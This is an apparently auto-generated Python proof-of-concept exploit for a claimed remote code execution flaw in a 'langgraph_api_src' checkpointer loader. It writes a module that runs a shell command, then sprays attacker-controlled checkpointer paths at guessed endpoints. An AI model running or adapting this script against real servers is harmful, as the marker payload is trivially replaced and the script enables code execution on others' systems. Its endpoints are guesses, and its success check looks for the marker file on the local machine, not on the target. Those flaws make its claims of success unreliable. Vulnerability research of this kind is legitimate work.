#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-015
# Sink: _load_checkpointer
# Auto-generated — run with: python3 rce_if_control__load_checkpointer.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langgraph_api_src.
The _load_checkpointer function in _adapter.py uses importlib.util.spec_from_file_location
with an attacker-controlled path, allowing arbitrary Python file loading.
"""

import requests
import sys
import os
import tempfile
import argparse

# Default target - change as needed
TARGET_URL = "http://localhost:8000"

def create_malicious_checkpointer():
    """
    Create a temporary Python file that will execute our payload when loaded.
    Returns the path to the malicious file.
    """
    # Create a temporary directory
    temp_dir = tempfile.mkdtemp()
    
    # Create a malicious checkpointer module
    malicious_code = '''
import os

# Benign payload - creates a marker file to prove RCE
os.system("touch /tmp/poc_success.txt")

# This is the checkpointer function that will be called
def get_checkpointer(config=None):
    return None
'''
    
    # Write the malicious file
    malicious_path = os.path.join(temp_dir, "malicious_checkpointer.py")
    with open(malicious_path, "w") as f:
        f.write(malicious_code)
    
    return malicious_path

def exploit(target_url, checkpointer_path):
    """
    Attempt to trigger the RCE by sending a request that causes
    the server to load our malicious checkpointer.
    """
    # The vulnerability is in the checkpointer_path parameter
    # We need to find an endpoint that accepts this parameter
    
    # Common endpoints that might accept checkpointer configuration
    endpoints = [
        "/checkpointer/load",
        "/api/checkpointer",
        "/graph/run",
        "/execute",
        "/api/execute",
    ]
    
    for endpoint in endpoints:
        url = f"{target_url}{endpoint}"
        
        # Try different request methods and parameter formats
        payloads = [
            {"checkpointer_path": checkpointer_path},
            {"config": {"checkpointer_path": checkpointer_path}},
            {"checkpointer": checkpointer_path},
        ]
        
        for payload in payloads:
            try:
                # Try POST with JSON
                response = requests.post(url, json=payload, timeout=10)
                print(f"[*] POST {url} - Status: {response.status_code}")
                
                # Try GET with query parameters
                response = requests.get(url, params=payload, timeout=10)
                print(f"[*] GET {url} - Status: {response.status_code}")
                
            except requests.exceptions.ConnectionError:
                print(f"[!] Connection error to {url}")
            except requests.exceptions.Timeout:
                print(f"[!] Timeout for {url}")
            except Exception as e:
                print(f"[!] Error: {e}")

def main():
    parser = argparse.ArgumentParser(description="PoC for langgraph_api_src RCE")
    parser.add_argument("--target", default=TARGET_URL, help="Target URL")
    parser.add_argument("--checkpointer", help="Custom checkpointer path (optional)")
    args = parser.parse_args()
    
    print("[*] Creating malicious checkpointer module...")
    
    if args.checkpointer:
        checkpointer_path = args.checkpointer
        print(f"[*] Using provided checkpointer path: {checkpointer_path}")
    else:
        # Create our malicious checkpointer
        malicious_path = create_malicious_checkpointer()
        checkpointer_path = f"{malicious_path}:get_checkpointer"
        print(f"[*] Created malicious checkpointer at: {malicious_path}")
        print(f"[*] Checkpointer path: {checkpointer_path}")
    
    print("\n[*] Attempting to trigger RCE...")
    print("[*] The exploit will try to load our malicious checkpointer")
    print("[*] If successful, it will create /tmp/poc_success.txt\n")
    
    exploit(args.target, checkpointer_path)
    
    # Check if the exploit was successful
    if os.path.exists("/tmp/poc_success.txt"):
        print("\n[+] SUCCESS! RCE achieved!")
        print("[+] File /tmp/poc_success.txt was created")
        # Clean up
        os.remove("/tmp/poc_success.txt")
    else:
        print("\n[-] Could not verify RCE - check if the target is running")
        print("[*] The malicious file may still be loaded on the server")
        print("[*] Check /tmp/poc_success.txt on the target system")

if __name__ == "__main__":
    main()
